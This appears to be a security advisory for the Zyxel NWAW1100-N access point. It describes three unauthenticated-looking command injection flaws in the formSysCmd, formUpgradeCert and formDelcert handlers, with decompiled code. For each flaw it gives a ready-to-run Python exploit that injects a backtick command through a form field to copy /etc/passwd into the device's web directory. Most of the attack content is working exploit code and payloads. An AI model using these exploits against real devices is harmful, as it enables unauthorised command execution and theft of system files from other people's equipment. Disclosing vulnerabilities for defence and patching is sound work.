## zyxel NWAW1100-N rce

offical website：https://www.zyxel.cn/

model ：NWAW1100-N 

Firmware Version: 1.00(AACE.1)C0

introduction：https://prodotti.zyxel.it/USERSGUIDE/ZYXNWA-1100-N.pdf

NWAW1100-N is an Access Point produced by zyxel. Through reverse analysis, it is found that it has the following three command execution vulnerabilities.
![7593e17eb3feae2d98250046e4ab4bf](./zyxel NWAW1100-N rce.assets/7593e17eb3feae2d98250046e4ab4bf.jpg)
![image](https://github.com/user-attachments/assets/6fcbb93d-d04e-4f77-933d-68b5e23688ae)
![image](https://github.com/user-attachments/assets/5f0ee271-0a30-45a6-ac87-8d5d3a724202)




#### Vulnerability 1

##### function formSysCmd

![image](https://github.com/user-attachments/assets/b06ed648-2225-4133-ad01-fada8a0e36e2)


`sysCmd` as a parameter can be exploited by malicious attackers to construct command execution. 

```
    snprintf(v5, 100, "%s 2>&1 > %s", Var, "/tmp/syscmd.log");
    system(v5);
```

The `var` variable first receives the value of `sysCmd`, and then is concatenated and passed to the `system` function for execution.

##### exp

```python
import requests

url = "http://192.168.1.2:80/goform/formSysCmd"
headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://192.168.1.2", "Connection": "close", "Referer": "http://192.168.1.2/sys_system.asp", "Upgrade-Insecure-Requests": "1"}
data = {"sysCmd": "`cat /etc/passwd > /var/webpages/test.css`"}
requests.post(url, headers=headers, data=data)
```

![image](https://github.com/user-attachments/assets/63dd2830-8a20-4b9a-89dd-8771ab37bf2d)




#### Vulnerability 2

##### function formUpgradeCert

![image](https://github.com/user-attachments/assets/ea311c66-dc72-4891-a5cf-de80afe13439)


```
 ......
 Var = websGetVar(a1, "upname", (int)&byte_43D298);
 ......
 sprintf(v9, "mv %sUnknowing.pfx %s%s", "/var/cert/", "/var/cert/", Var);
 system(v9);
 ......
```

Here the Var variable accepts the upname argument, and then concatenates the command to execute the system function. There is no validation here, so it can be bypassed with backquotes, resulting in command execution vulnerabilities

![image](https://github.com/user-attachments/assets/88c1ce3b-cb32-47b4-86e0-a49abe1180ca)


Here, because there is some processing of the Var variable, the character 'aaaa' is added before and after the payload

##### exp

```
import requests

url = "http://192.168.1.2:80/goform/formUpgradeCert"
headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://192.168.1.2", "Connection": "close", "Referer": "http://192.168.1.2/sys_system.asp", "Upgrade-Insecure-Requests": "1"}
data = {"upname": "aaaaa`cat /etc/passwd > /var/webpages/test222.css`aaaaa"}
requests.post(url, headers=headers, data=data)
```

![image](https://github.com/user-attachments/assets/255fcc5d-4bd2-4e03-9ea3-6624da9c9952)


#### Vulnerability 3

##### function formDelcert

![image](https://github.com/user-attachments/assets/eedb4419-f89f-4944-b4c6-94e94d6ee723)


Here the var variable takes the value of the cert parameter and then concatenates the command behind it to execute the system function.

exp

```
import requests

url = "http://192.168.1.2:80/goform/formDelcert"
headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://192.168.1.2", "Connection": "close", "Referer": "http://192.168.1.2/sys_system.asp", "Upgrade-Insecure-Requests": "1"}
data = {"certs": "`cat /etc/passwd > /var/webpages/test333.css`"}
requests.post(url, headers=headers, data=data)
```

![image](https://github.com/user-attachments/assets/8a090b36-52f9-46b8-b3ca-1ca710d66360)
